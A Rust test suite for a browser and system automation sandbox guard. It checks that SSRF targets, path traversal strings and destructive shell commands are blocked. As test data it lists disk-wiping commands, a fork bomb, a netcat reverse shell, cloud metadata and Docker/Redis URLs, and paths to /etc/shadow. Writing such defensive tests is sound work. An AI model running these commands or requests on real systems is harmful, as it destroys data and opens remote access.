//! Challenger Test Suite for Milestone 4: Browser & System Automation
//! Adversarial Fuzzing, SSRF Evasion, Deep DOM Nesting, Path Traversal, and Concurrency Stress.

use liva_native_core::automation::{
    BrowserDriver, DomExtractMode, MockBrowserDriver, MockSystemAutomationDriver, SandboxGuard,
    SandboxPolicy, SandboxViolation, SemanticDomExtractor, SystemAutomationDriver,
};
use std::path::{Path, PathBuf};
use std::sync::Arc;

#[test]
fn test_adv_sandbox_ssrf_obfuscated_and_private_targets() {
    let policy = SandboxPolicy {
        allowed_domains: vec!["*".to_string()],
        blocked_domains: vec![],
        allowed_read_paths: vec![],
        allowed_write_paths: vec![],
        command_denylist: vec![],
        max_execution_time_secs: 30,
        max_memory_mb: 512,
        allow_child_processes: false,
    };
    let guard = SandboxGuard::new(policy);

    let evasion_urls = vec![
        "http://169.254.169.254/latest/dynamic/instance-identity/",
        "http://127.0.0.1:2375/v1.24/containers/json", // Docker daemon
        "http://localhost:6379/INFO",                  // Redis
        "http://0.0.0.0:8000/internal",
        "http://[::1]:3000/metrics",
        "http://10.244.0.5:8080/kubernetes-api",
        "http://192.168.1.254/status",
        "http://172.16.0.1/admin",
        "http://172.31.255.255/metadata",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://server.corp/internal-vault",
        "http://myhost.local/config",
    ];

    for url in evasion_urls {
        let res = guard.validate_url(url);
        assert!(
            matches!(res, Err(SandboxViolation::SsrfAttempt(_))),
            "Expected SSRF violation for URL: {}",
            url
        );
    }
}

#[test]
fn test_adv_sandbox_path_traversal_fuzzing() {
    let policy = SandboxPolicy {
        allowed_domains: vec![],
        blocked_domains: vec![],
        allowed_read_paths: vec![PathBuf::from("/vault/safe")],
        allowed_write_paths: vec![PathBuf::from("/vault/safe/logs")],
        command_denylist: vec![],
        max_execution_time_secs: 10,
        max_memory_mb: 256,
        allow_child_processes: false,
    };
    let guard = SandboxGuard::new(policy);

    let traversal_paths = vec![
        Path::new("/vault/safe/logs/../../secrets.json"),
        Path::new("/vault/safe/logs/..\\..\\windows\\system32"),
        Path::new("/vault/safe/logs/foo\0bar"),
        Path::new("../../../etc/shadow"),
        Path::new("/vault/safe/logs/sub/../../../../etc/passwd"),
    ];

    for p in traversal_paths {
        let res = guard.validate_path(p, true);
        assert!(
            matches!(res, Err(SandboxViolation::PathJailbreak(_))),
            "Path traversal '{:?}' must be detected and blocked",
            p
        );
    }
}

#[test]
fn test_adv_sandbox_destructive_commands_fuzzing() {
    let policy = SandboxPolicy::default();
    let guard = SandboxGuard::new(policy);

    let dangerous_inputs = vec![
        "rm -rf / --no-preserve-root",
        "sudo rm -rf /home/user",
        "mkfs.ext4 /dev/nvme0n1p1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "cat /dev/urandom > /dev/sda1",
        ":(){ :|:& };:",
        "chmod -R 777 /",
        "chown -R root /etc",
        "shutdown -h now",
        "reboot",
        "init 0",
        "nc -e /bin/sh 10.0.0.1 4444",
    ];

    for cmd in dangerous_inputs {
        let res = guard.validate_command(cmd);
        assert!(
            matches!(res, Err(SandboxViolation::DestructiveCommand(_))),
            "Destructive command '{}' must be blocked",
            cmd
        );
    }

    // Safe commands
    assert!(guard.validate_command("echo 'hello world'").is_ok());
    assert!(guard.validate_command("cargo test --workspace").is_ok());
}

#[test]
fn test_adv_dom_extractor_deep_nesting_and_malformed() {
    // 1. Deeply nested HTML
    let mut deep_html = String::from("<html><body>");
    for _ in 0..200 {
        deep_html.push_str("<div><section>");
    }
    deep_html.push_str("<h1>Deep Content</h1><p>Nested Text</p><button>Deep Button</button>");
    for _ in 0..200 {
        deep_html.push_str("</section></div>");
    }
    deep_html.push_str("</body></html>");

    let clean_md = SemanticDomExtractor::extract(&deep_html, DomExtractMode::CleanMarkdown);
    assert!(clean_md.contains("# Deep Content"));
    assert!(clean_md.contains("Nested Text"));
    assert!(clean_md.contains("[Button: Deep Button]"));

    // 2. Unclosed and malformed HTML
    let unclosed = "<html><head><script>evil()<body><h1>Header<p>Unclosed paragraph<button>Submit";
    let plain = SemanticDomExtractor::extract(unclosed, DomExtractMode::PlainText);
    assert!(plain.contains("Header"));
    assert!(plain.contains("Unclosed paragraph"));
}

#[tokio::test]
async fn test_adv_browser_driver_concurrent_stress() {
    let policy = SandboxPolicy {
        allowed_domains: vec!["*.example.com".to_string()],
        blocked_domains: vec![],
        allowed_read_paths: vec![],
        allowed_write_paths: vec![],
        command_denylist: vec![],
        max_execution_time_secs: 10,
        max_memory_mb: 256,
        allow_child_processes: false,
    };

    let driver = Arc::new(MockBrowserDriver::new(policy));
    let mut handles = Vec::new();

    for i in 0..20 {
        let drv = driver.clone();
        handles.push(tokio::spawn(async move {
            let url = format!("https://test{}.example.com/page", i);
            let meta = drv.navigate(&url).await.unwrap();
            assert_eq!(meta.url, url);
            let md = drv.extract_content(DomExtractMode::CleanMarkdown).await.unwrap();
            assert!(!md.is_empty());
            drv.click("button.submit").await.unwrap();
            drv.type_text("input.search", &format!("query {}", i)).await.unwrap();
            let shot = drv.screenshot_viewport().await.unwrap();
            assert_eq!(&shot[1..4], b"PNG");
        }));
    }

    for h in handles {
        h.await.unwrap();
    }

    let clicks = driver.clicks.read().await;
    assert_eq!(clicks.len(), 20);
    let typed = driver.typed_texts.read().await;
    assert_eq!(typed.len(), 20);
}

#[tokio::test]
async fn test_adv_system_driver_concurrency() {
    let driver = Arc::new(MockSystemAutomationDriver::new());
    let mut handles = Vec::new();

    for i in 0..20 {
        let drv = driver.clone();
        handles.push(tokio::spawn(async move {
            let wins = drv.list_windows().await.unwrap();
            assert!(!wins.is_empty());
            drv.focus_window(1).await.unwrap();
            drv.move_mouse(100 + i, 200 + i).await.unwrap();
            drv.send_key_action(liva_native_core::automation::KeyAction::KeyStroke(0x20)).await.unwrap();
            let screen = drv.capture_screen(None).await.unwrap();
            assert_eq!(&screen[1..4], b"PNG");
        }));
    }

    for h in handles {
        h.await.unwrap();
    }

    let recorded_keys = driver.recorded_keys.lock().await;
    assert_eq!(recorded_keys.len(), 20);
    let moves = driver.recorded_mouse_moves.lock().await;
    assert_eq!(moves.len(), 20);
}
